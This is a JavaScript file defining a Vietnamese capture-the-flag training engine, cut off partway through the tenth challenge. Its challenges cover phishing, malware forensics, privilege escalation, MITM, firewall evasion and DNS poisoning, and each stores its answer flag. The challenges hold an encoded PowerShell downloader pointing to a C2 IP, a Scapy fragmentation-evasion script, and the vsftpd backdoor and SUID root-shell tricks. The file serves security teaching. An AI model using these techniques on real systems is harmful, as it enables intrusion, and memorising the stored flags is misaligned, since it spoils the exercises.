/**
 * CTF (Capture The Flag / Packet) Challenge Engine
 * Comprehensive Hands-on Cybersecurity & Network Protocols Labs
 * Covering all 7 IT Infrastructure Domains + Core Networking CCNA
 */
class CTFEngine {
    constructor() {
        this.challenges = [
            // =========================================================================
            // DOMAIN 1: VÙNG NGƯỜI DÙNG (USER DOMAIN)
            // =========================================================================
            {
                id: 1,
                domain: "user",
                domainVi: "1. Vùng Người Dùng (User Domain)",
                title: "Thử Thách 1: Phishing Email Header & Điều Tra Giả Mạo SPF/DKIM",
                category: "Kỹ Nghệ Xã Hội (Social Engineering / Phishing)",
                difficulty: "Dễ",
                points: 100,
                description: "Một email khẩn cấp gửi tới Trưởng phòng Tài chính giả mạo CEO yêu cầu duyệt chi tiền gấp vào tài khoản lạ. Đội ngũ SOC đã trích xuất toàn bộ tiêu đề thư RFC 5322 (Email Header). Hãy phân tích các trường Authentication-Results, Received, và liên kết độc hại để xác định kết quả kiểm tra SPF, địa chỉ IP máy chủ gửi và tên miền C2!",
                codeSnippet: `Delivered-To: victim_cfo@corp-finance.com
Received: by 2002:a17:906:85c1:: with SMTP id ab12;
        Mon, 17 Nov 2026 09:14:22 -0800 (PST)
Received: from mail.secure-invoicing-gateway.org (mail.secure-invoicing-gateway.org [194.26.29.112])
        by mx.google.com with ESMTP id q12si89012qkj.45
        for <victim_cfo@corp-finance.com>;
Received-SPF: softfail (google.com: domain of transitioning billing@secure-invoicing-gateway.org does not designate 194.26.29.112 as permitted sender) client-ip=194.26.29.112;
Authentication-Results: mx.google.com;
       dkim=neutral (bad sig) header.i=@corp-finance.com;
       spf=softfail (google.com: domain of billing@secure-invoicing-gateway.org) smtp.mailfrom=billing@secure-invoicing-gateway.org;
       dmarc=fail (p=NONE) header.from=corp-finance.com
From: "CEO Michael" <ceo@corp-finance.com>
Reply-To: "Finance Verification" <verify@cloud-invoice-pay.xyz>
To: victim_cfo@corp-finance.com
Subject: [URGENT] Thanh toán hóa đơn nhà cung cấp hạ tầng
Content-Type: text/html; charset="UTF-8"

<p>Vui lòng đối soát và chuyển khoản ngay trước 17h hôm nay tại cổng:</p>
<a href="https://auth.cloud-invoice-pay.xyz/portal/verify?id=99281">Xác nhận chuyển khoản</a>

---
YÊU CẦU:
1. Xác định kết quả kiểm tra SPF ghi nhận trong Authentication-Results (ví dụ: pass, fail, softfail, none).
2. Xác định địa chỉ IPv4 của máy chủ gửi thư thực tế (client-ip).
3. Xác định tên miền C2 lừa đảo trong liên kết xác nhận (Domain trong URL liên kết thẻ <a>).
Cú pháp cờ: FLAG{<kết_quả_SPF>_<client_ip>_<tên_miền_c2>}
(Ví dụ mẫu cú pháp: FLAG{fail_1.2.3.4_example.com})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>MXToolbox Email Header Analyzer</b> / <b>Google Admin Toolbox (Messageheader)</b>: Phân tích trực quan các chặng email.<br>
            • <b>CyberChef</b> / <b>Text Editor</b>: Tìm kiếm các trường RFC 5322.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Xem dòng <code>Authentication-Results</code> hoặc <code>Received-SPF</code>: Đọc kết quả SPF của máy chủ gửi thư.<br>
            2. Chặng mạng <code>Received: from ...</code> chứa tham số <code>client-ip</code> chỉ ra địa chỉ IP của máy chủ relay thực tế.<br>
            3. Xem thẻ liên kết <code>&lt;a href="..."&gt;</code> ở phần nội dung thư: Trích xuất hostname/domain chính của trang web phishing.<br>
            4. Ghép 3 thành phần trên lại thành cờ theo đúng mẫu cú pháp.
        </div>
    </div>
</div>`,
                flag: "FLAG{softfail_194.26.29.112_cloud-invoice-pay.xyz}"
            },
            {
                id: 2,
                domain: "user",
                domainVi: "1. Vùng Người Dùng (User Domain)",
                title: "Thử Thách 2: Bẫy Vật Lý USB Baiting & Giải Mã PowerShell Dropper",
                category: "Bẫy Vật Lý (Baiting / USB Drop)",
                difficulty: "Trung bình",
                points: 150,
                description: "Nhân viên nhặt được chiếc USB có dán nhãn 'Danh_Sach_Thuong_Tet_2026.pdf.lnk' tại sảnh công ty và cắm vào máy tính. File shortcut kích hoạt tiến trình ngầm powershell.exe với tham số -Enc (EncodedCommand) để tải mã độc vào bộ nhớ. Hãy giải mã payload Base64 UTF-16LE để bóc trần hàm tải file, địa chỉ IP C2 và cổng lắng nghe!",
                codeSnippet: `# Trích xuất đối số dòng lệnh từ Shortcut LNK qua sự kiện Sysmon Event ID 1:
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA2ADYAOgA5ADAAMAAxAC8AYwAyAC4AZQB4AGUAJwAsACAAJwBjADoAXAB0AG1wAFwAdgBpAHIAdQBzAC4AZQB4AGUAJwApAA==

---
YÊU CẦU:
Giải mã chuỗi Base64 UTF-16LE trên để tìm:
1. Tên phương thức được gọi từ đối tượng Net.WebClient (ví dụ: DownloadString, DownloadFile, OpenRead...)
2. Địa chỉ IP của máy chủ C2
3. Cổng (Port) kết nối
Cú pháp cờ: FLAG{<tên_phương_thức>_<IP_C2>_<Port>}
(Ví dụ mẫu cú pháp: FLAG{DownloadData_10.0.0.1_8080})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>NETLAB Virtual Terminal</b>: Bạn có thể gõ ngay lệnh <code>b64 decode &lt;chuỗi&gt;</code> ở console bên dưới!<br>
            • <b>CyberChef</b>: Recipe <code>From Base64</code> -> <code>Decode text UTF-16LE</code>.<br>
            • <b>Python CLI</b>: <code>base64.b64decode("...").decode("utf-16le")</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. PowerShell trên Windows mã hóa tham số <code>-enc</code> dưới dạng UTF-16LE (Unicode 16-bit Little Endian).<br>
            2. Sau khi giải mã, bạn sẽ thấy câu lệnh gọi một phương thức của lớp <code>Net.WebClient</code> để tải mã độc từ một địa chỉ IP và Port cụ thể.<br>
            3. Trích xuất đúng tên hàm, IP và Port để hoàn thành cờ.
        </div>
    </div>
</div>`,
                flag: "FLAG{DownloadFile_192.168.100.66_9001}"
            },

            // =========================================================================
            // DOMAIN 2: VÙNG MÁY TRẠM (WORKSTATION DOMAIN)
            // =========================================================================
            {
                id: 3,
                domain: "workstation",
                domainVi: "2. Vùng Máy Trạm (Workstation Domain)",
                title: "Thử Thách 3: Điều Tra Ransomware & Truy Tìm Kill-Switch Domain",
                category: "Mã Độc Máy Trạm (Ransomware Forensics)",
                difficulty: "Trung bình",
                points: 150,
                description: "Trạm làm việc của kế toán viên bị tấn công bởi mã độc tống tiền họ WannaCry từ tiến trình tasksche.exe, toàn bộ dữ liệu bị đổi đuôi sang .wncry. Trước khi mã hóa ổ cứng, mã độc luôn gửi request HTTP GET tới một domain sinkhole (Kill-Switch). Phân tích chuỗi nhị phân (strings dump) của tiến trình để tìm domain giải cứu này!",
                codeSnippet: `$ strings -a -t x tasksche_dump.dmp | grep -E "http://|reg|crypt"
  10a020  http://schemas.microsoft.com/expression/2006
  10a180  CryptAcquireContextA
  10a240  RegOpenKeyExA (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
  10a3b0  http://www.w3.org/1999/xhtml
  10b050  CryptGenRandom
  10b120  InternetOpenA (User-Agent: Mozilla/4.0)
  10b190  http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
  10b250  CryptEncrypt
  10b310  InternetOpenUrlA
  10b420  http://ocsp.digicert.com
  10b550  RegSetValueExA
  10b680  cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet

---
YÊU CẦU:
Tìm tên miền sinkhole (Kill-Switch) bất thường mà mã độc kết nối tới để kiểm tra trước khi gọi hàm mã hóa CryptEncrypt.
Cú pháp cờ: FLAG{<tên_miền_killswitch>}
(Ví dụ: FLAG{www.example-domain.com})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Volatility Framework</b>: <code>vol.py -f mem.dmp windows.strings</code>.<br>
            • <b>Sysinternals Strings / Linux CLI</b>: Tìm kiếm chuỗi URL trong bộ nhớ.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Các URL như <code>w3.org</code>, <code>microsoft.com</code>, <code>digicert.com</code> là các domain hợp lệ của hệ điều hành Windows.<br>
            2. Hãy tìm tên miền dài bất thường được mã độc truy vấn thông qua hàm <code>InternetOpenUrlA</code> ngay trước khi kích hoạt hàm mã hóa <code>CryptEncrypt</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com}"
            },
            {
                id: 4,
                domain: "workstation",
                domainVi: "2. Vùng Máy Trạm (Workstation Domain)",
                title: "Thử Thách 4: Leo Thang Đặc Quyền Linux Qua SUID Bit (GTFOBins)",
                category: "Leo Thang Đặc Quyền (Local Privilege Escalation)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Kẻ tấn công chiếm được tài khoản thường devops (uid=1001) trên máy trạm lập trình viên. Rà quét phân quyền phát hiện một binary hệ thống được bật cờ SUID (-rwsr-xr-x) thuộc quyền root. Hãy xác định cú pháp GTFOBins chuẩn với binary /usr/bin/find để spawn một root shell và chiếm quyền quản trị cao nhất!",
                codeSnippet: `devops@workstation:~$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops)

devops@workstation:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/find
/usr/bin/mount
/usr/bin/pkexec

devops@workstation:~$ ls -l /usr/bin/find
-rwsr-xr-x 1 root root 198944 Jan 15 2026 /usr/bin/find

---
YÊU CẦU:
Tra cứu kho lưu trữ GTFOBins cho binary có cờ SUID trên. Xác định cú pháp khai thác với binary 'find':
Thực thi lệnh shell 'sh' với tham số bảo toàn quyền root ('-p').
Cú pháp cờ: FLAG{find_exec_<tên_shell>_<cờ_bảo_toàn_quyền>}
(Ví dụ: nếu thực thi bash với cờ -p thì cú pháp là: FLAG{find_exec_bash_p})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>GTFOBins</b>: Trang tra cứu leo thang đặc quyền kinh điển tại <code>gtfobins.github.io/gtfobins/find</code>.<br>
            • <b>LinPEAS</b>: Script tự động dò lỗ hổng SUID trên Linux.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Binary <code>find</code> hỗ trợ tham số <code>-exec</code> để chạy một shell bên ngoài.<br>
            2. Khi binary có SUID của root, shell <code>sh</code> cần cờ gì để không bị hạ quyền (preserve privileges)?<br>
            3. Ghép nối tên shell và cờ đó theo định dạng cờ yêu cầu.
        </div>
    </div>
</div>`,
                flag: "FLAG{find_exec_sh_p}"
            },

            // =========================================================================
            // DOMAIN 3: VÙNG MẠNG LAN (LAN DOMAIN)
            // =========================================================================
            {
                id: 5,
                domain: "lan",
                domainVi: "3. Vùng Mạng LAN (LAN Domain)",
                title: "Thử Thách 5: Bắt Gói Tin ARP Poisoning & Đánh Chặn NetNTLMv2",
                category: "Tấn Công Trung Gian (MITM / ARP Spoofing)",
                difficulty: "Trung bình",
                points: 150,
                description: "Kẻ tấn công cắm laptop vào ổ cắm mạng LAN phòng họp và gửi các gói tin Gratuitous ARP giả mạo để chiếm vị trí trung gian giữa máy kế toán 192.168.1.50 và Gateway 192.168.1.1. Phân tích file pcap để xác định địa chỉ MAC của kẻ tấn công và giá trị Username bị nghe lén trong phiên xác thực SMB/NTLMSSP!",
                codeSnippet: `=== WIRESHARK PACKET SNIPPET (lan_sniff.pcap) ===

[Frame 41] 09:30:01.102 ARP Reply
    Sender MAC: 00:0c:29:ab:cd:ef
    Sender IP:  192.168.1.1 (Gateway IP)
    Target MAC: 00:1a:2b:3c:4d:5e (Victim IP: 192.168.1.50)
    [Expert Info (Warning/Sequence): Duplicate IP address detected for 192.168.1.1!
     Real Gateway MAC previously recorded: 00:50:56:c0:00:01]

[Frame 89] 09:30:05.420 SMB2 Protocol
    Source: 192.168.1.50:52410 -> Dest: 192.168.1.200:445
    Command: Session Setup Request (0x0001)
    Security Blob (NTLMSSP):
        NTLMSSP_AUTH
        Domain: CORP-NET
        User: hr_director
        Workstation: PC-HR-04
        NTLMv2 Response: 8a4b2c1d0e...

---
YÊU CẦU:
1. Xác định địa chỉ MAC của kẻ tấn công đang gửi gói ARP đầu độc mạng (Sender MAC trong Frame 41).
2. Xác định Username của nạn nhân bị đánh chặn xác thực SMB2 (User trong Frame 89).
Cú pháp cờ: FLAG{<MAC_Attacker>_<Username>}
(Ví dụ mẫu cú pháp: FLAG{11:22:33:44:55:66_admin})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Wireshark Filter</b>: <code>arp.duplicate-address-detected || ntlmssp.auth.username</code>.<br>
            • <b>Responder / Ettercap</b>: Công cụ MITM đánh chặn NTLM hash trong mạng nội bộ.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Trong Frame 41, so sánh địa chỉ MAC thật của Gateway (ghi trong phần Expert Info) và Sender MAC của kẻ mạo danh.<br>
            2. Trong Frame 89, xem trường Security Blob -> NTLMSSP -> NTLMSSP_AUTH để trích xuất tên người dùng <code>User</code>.<br>
            3. Ghép nối 2 giá trị này lại theo đúng cú pháp cờ.
        </div>
    </div>
</div>`,
                flag: "FLAG{00:0c:29:ab:cd:ef_hr_director}"
            },
            {
                id: 6,
                domain: "lan",
                domainVi: "3. Vùng Mạng LAN (LAN Domain)",
                title: "Thử Thách 6: Vạch Trần Wi-Fi Giả Mạo Evil Twin & Rogue AP",
                category: "Tấn Công WLAN (Evil Twin / Rogue AP)",
                difficulty: "Trung bình",
                points: 150,
                description: "Kẻ tấn công dựng trạm phát sóng Wi-Fi giả mạo (Evil Twin) phát cùng SSID 'CAMPUS_STUDENT_WIFI' với công suất phát rất cao nhằm dụ các máy laptop tự động nhảy kết nối để bắt trọn lưu lượng web. Hãy phân tích bảng quét tần số từ airodump-ng để tìm ra BSSID của Rogue AP và kênh (Channel) hoạt động!",
                codeSnippet: `$ airodump-ng wlan0mon --essid "CAMPUS_STUDENT_WIFI"

BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID
-----------------  ---  -------  -----  --  ---  ---  ------  ----  --------------------
00:14:D1:E2:40:10  -78      210    150   1  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI
00:14:D1:E2:40:20  -75      190    180   6  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI
B4:82:C5:99:11:AA  -19     1240   3820   9  54e  OPN          NONE  CAMPUS_STUDENT_WIFI
00:14:D1:E2:40:30  -80      205    120  11  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI

---
YÊU CẦU:
Phân tích bảng quét để tìm trạm phát sóng Wi-Fi giả mạo (Evil Twin / Rogue AP):
1. BSSID của Rogue AP (viết hoa các ký tự chữ)
2. Số kênh (Channel - cột CH) mà Rogue AP đang phát sóng
Cú pháp cờ: FLAG{<BSSID>_ch<Channel>}
(Ví dụ mẫu cú pháp: FLAG{AA:BB:CC:DD:EE:FF_ch3})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Aircrack-ng suite</b>: <code>airodump-ng</code>, <code>airmon-ng</code>.<br>
            • <b>Kismet / Wi-Fi Analyzer</b>: Giám sát tần số không dây 2.4GHz / 5GHz.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Evil Twin AP thường có mức tín hiệu nhận (PWR) rất cao (số âm càng nhỏ càng mạnh, ví dụ -19 dBm so với -78 dBm) vì đặt gần nạn nhân.<br>
            2. Rogue AP thường hạ cấp mã hóa xuống <code>OPN</code> (Open - không mật khẩu) để dụ người dùng kết nối.<br>
            3. Xác định địa chỉ BSSID và số hiệu cột CH của AP khả nghi.
        </div>
    </div>
</div>`,
                flag: "FLAG{B4:82:C5:99:11:AA_ch9}"
            },

            // =========================================================================
            // DOMAIN 4: VÙNG LAN-TO-WAN (LAN-TO-WAN DOMAIN)
            // =========================================================================
            {
                id: 7,
                domain: "lan-to-wan",
                domainVi: "4. Vùng LAN-to-WAN (LAN-to-WAN Domain)",
                title: "Thử Thách 7: Rà Quét Nmap Thiết Bị Biên & Backdoor vsftpd 2.3.4",
                category: "Trinh Sát & Rà Quét (Port Scan / Vulnerability)",
                difficulty: "Trung bình",
                points: 150,
                description: "Kiểm thử viên quét trinh sát thiết bị biên (Edge Firewall / DMZ Gateway) bằng Nmap. Kết quả phát hiện cổng FTP chạy phiên bản vsftpd 2.3.4 dính lỗ hổng backdoor nổi tiếng trong lịch sử an ninh mạng (CVE-2011-2523). Hãy xác định chuỗi ký tự kích hoạt backdoor và số hiệu cổng TCP root shell mở ra!",
                codeSnippet: `$ nmap -sV -p 21,80,443 -Pn 203.0.113.88
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for edge-firewall.enterprise.vn (203.0.113.88)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
80/tcp  open  http    Apache httpd 2.4.41
443/tcp open  ssl/http Apache httpd 2.4.41

---
YÊU CẦU:
Dịch vụ FTP trên cổng 21 chạy phiên bản vsftpd 2.3.4 dính lỗ hổng backdoor nổi tiếng CVE-2011-2523:
1. Chuỗi ký tự mặt cười gồm 2 ký tự ASCII nào gửi ở cuối tên người dùng (USER) sẽ kích hoạt backdoor?
2. Số hiệu cổng TCP nào được dịch vụ tự động mở ra ở chế độ nền để trao root shell cho kẻ tấn công?
Cú pháp cờ: FLAG{vsftpd_<ký_tự_mặt_cười>_port_<số_cổng>}
(Ví dụ mẫu cú pháp: FLAG{vsftpd_:)_port_1234})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Nmap NSE Script</b>: <code>nmap --script ftp-vsftpd-backdoor -p 21 &lt;target&gt;</code>.<br>
            • <b>Metasploit Framework</b>: Tra cứu module <code>exploit/unix/ftp/vsftpd_234_backdoor</code>.<br>
            • <b>Exploit Database / CVE Details</b>: Tra cứu thông tin chi tiết CVE-2011-2523.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Tháng 7/2011, mã nguồn vsftpd 2.3.4 bị chèn mã độc kiểm tra chuỗi username kết thúc bằng biểu tượng mặt cười quen thuộc (dấu hai chấm và ngoặc đóng).<br>
            2. Cổng mở ngầm là một cổng TCP có 4 chữ số bắt đầu bằng số 62xx.<br>
            3. Ghép nối 2 thông tin theo đúng định dạng cờ yêu cầu.
        </div>
    </div>
</div>`,
                flag: "FLAG{vsftpd_:)_port_6200}"
            },
            {
                id: 8,
                domain: "lan-to-wan",
                domainVi: "4. Vùng LAN-to-WAN (LAN-to-WAN Domain)",
                title: "Thử Thách 8: Phân Mảnh Gói Tin IP (Fragmentation) Vượt Tường Lửa",
                category: "Vượt Tường Lửa (Firewall Evasion / IP Fragmentation)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Tường lửa Stateless ACL ở biên chặn các gói tin TCP SYN đến cổng bảo mật nội bộ 31337. Pentester sử dụng Scapy để chia nhỏ gói tin thành 2 phân mảnh IP (MTU = 8 bytes), khiến trường cổng đích L4 bị đẩy sang phân mảnh thứ 2. Tường lửa stateless không thể ráp gói tin và để lọt cả 2 fragment vào máy đích. Hãy phân tích đoạn mã Scapy và xác định giá trị trường cờ MF và Fragment Offset!",
                codeSnippet: `from scapy.all import *

target_ip = "198.51.100.25"
secret_port = 31337

# Pentester muốn gửi gói TCP SYN tới cổng bảo mật 31337 qua tường lửa Stateless.
# Để che giấu cổng đích ở phân mảnh đầu, pentester cắt TCP Header tại byte thứ 8:
frag0 = IP(dst=target_ip, id=4242, flags="MF", frag=0) / TCP(sport=50000, dport=secret_port, flags="S")[:8]

# Phân mảnh thứ hai chứa phần còn lại của TCP Header:
frag1 = IP(dst=target_ip, id=4242, flags=0, frag=???) / bytes(TCP(sport=50000, dport=secret_port, flags="S"))[8:]

send([frag0, frag1])

---
YÊU CẦU:
Trong tiêu chuẩn RFC 791, trường Fragment Offset (frag) trong IP Header được tính theo khối 8 byte.
Với phân mảnh thứ 2 bắt đầu từ byte thứ 8 của payload IP gốc, giá trị trường 'frag' bằng bao nhiêu?
Cú pháp cờ: FLAG{frag_offset_<giá_trị>_target_port_<cổng>}
(Ví dụ mẫu cú pháp: FLAG{frag_offset_2_target_port_80})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>Scapy (Python)</b>: Thư viện tạo gói tin mạng.<br>
            • <b>RFC 791</b>: Tiêu chuẩn giao thức Internet Protocol (IPv4 Specification).
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Trường Fragment Offset trong IPv4 Header được tính bằng: <code>Vị trí byte / 8</code>.<br>
            2. Phân mảnh thứ hai bắt đầu tại vị trí byte thứ 8. Lấy 8 chia 8 ta được giá trị của <code>frag</code>.<br>
            3. Cổng mục tiêu đang được gửi đến là cổng 31337.
        </div>
    </div>
</div>`,
                flag: "FLAG{frag_offset_1_target_port_31337}"
            },

            // =========================================================================
            // DOMAIN 5: VÙNG MẠNG WAN (WAN DOMAIN)
            // =========================================================================
            {
                id: 9,
                domain: "wan",
                domainVi: "5. Vùng Mạng WAN (WAN Domain)",
                title: "Thử Thách 9: Điều Tra Tấn Công SYN Flood DDoS & Kích Hoạt SYN Cookies",
                category: "Từ Chối Dịch Vụ (DoS / DDoS / SYN Flood)",
                difficulty: "Trung bình",
                points: 150,
                description: "Hệ thống Cổng thông tin tài chính bị hàng vạn IP ma từ Internet liên tục gửi các gói tin TCP SYN mà không gửi phản hồi ACK cuối cùng. Hàng đợi kết nối bán mở (SYN Backlog Queue) bị đầy nghẽn khiến người dùng hợp lệ bị từ chối phục vụ (DDoS). Quản trị viên cần kích hoạt cơ chế phòng vệ nào trong nhân Linux Kernel qua sysctl để chống lại đòn tấn công này?",
                codeSnippet: `$ netstat -nat | grep SYN_RECV | wc -l
78450

$ dmesg | tail -n 4
[ 4812.102] TCP: request_sock_TCP: Possible SYN flooding on port 443. Dropping request.
[ 4812.108] TCP: SYN queue backlog is full! Legitimate clients unable to connect.
[ 4812.115] TCP: Recommend enabling kernel protection mechanism in sysctl.

$ sysctl net.ipv4.tcp_syncookies
net.ipv4.tcp_syncookies = 0

---
YÊU CẦU:
Để chống cạn kiệt bộ nhớ SYN Backlog mà không cần cấp phát socket nửa mở, quản trị viên cần thiết lập giá trị bằng 1 cho tham số kernel nào?
Cú pháp cờ: FLAG{<tên_tham_số_sysctl>=1}
(Ví dụ mẫu cú pháp: FLAG{net.ipv4.ip_forward=1})`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <b>netstat / ss</b>: Giám sát trạng thái kết nối TCP (SYN_RECV).<br>
            • <b>Linux sysctl</b>: Quản lý các biến tham số mạng trong kernel Linux.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            1. Xem lệnh <code>sysctl net.ipv4...</code> trong đoạn output ở trên.<br>
            2. Tham số này hiện có giá trị là 0 (đang tắt). Để kích hoạt cơ chế SYN Cookies chống DDoS, cần gán giá trị bằng 1.
        </div>
    </div>
</div>`,
                flag: "FLAG{net.ipv4.tcp_syncookies=1}"
            },
            {
                id: 10,
                domain: "wan",
                domainVi: "5. Vùng Mạng WAN (WAN Domain)",
                title: "Thử Thách 10: Đầu Độc Bộ Nhớ Đệm DNS (Kaminsky Cache Poisoning)",
                category: "Tấn Công Hạ Tầng Internet (DNS Poisoning / Spoofing)",
                difficulty: "Nâng cao",
                points: 200,
                description: "Kẻ tấn công trên mạng diện rộng WAN khai thác lỗi thiết kế DNS thời kỳ đầu (Kaminsky Bug) bằng cách bắn liên tục hàng ngàn gói tin DNS Response giả mạo với các Transaction ID (TXID) ngẫu nhiên để ghi đè bản ghi A của máy chủ ngân hàng vietbank.vn trỏ về máy chủ lừa đảo. Hãy phân tích đoạn log gói tin DNS Response trúng khớp TXID để xác định IP máy chủ lừa đảo!",
                codeSnippet: `=== RECURSIVE DNS RESOLVER QUERY ===
Resolver: 192.168.10.1:53210 -> Root/TLD DNS
Question: a87b12.vietbank.vn (Type A, Class IN)
Generated TXID: 0x9c4e

=== INTERCEPTED SPOOFED RESPONSE INJECTED BY ATTACKER ===
Transaction ID: 0x9c4e  [MATCHED!]
Flags: 0x8180 (Standard response, No error)
Questions: a87b12.vietbank.vn: type A
Answers:
    a87b12.vietbank.vn: type A, TTL 30, addr 185.220.101.55
Authoritative nameservers:
    vietbank.vn: type NS, TTL 86400, ns.attacker-controlled-dns.com
Additional records:
    ns.attacker-controlled-dns.com: type A, TTL 86400, addr 185.220.101.55
    vietbank.vn: type A, TTL 86400, addr 194.26.29.88  <-- [POISONED ENTRY]

---
YÊU CẦU:
1. Xác định giá trị Transaction ID (TXID) dạng thập lục phân (có tiền tố 0x).
2. Xác định địa chỉ IPv4 độc hại được kẻ tấn công gán cho tên miền chính 'vietbank.vn' trong phần Additional records để đầu độc cache.
Cú pháp cờ: FLAG{txid_<giá_trị_hex>_ip_<IP_đầu_độc>}
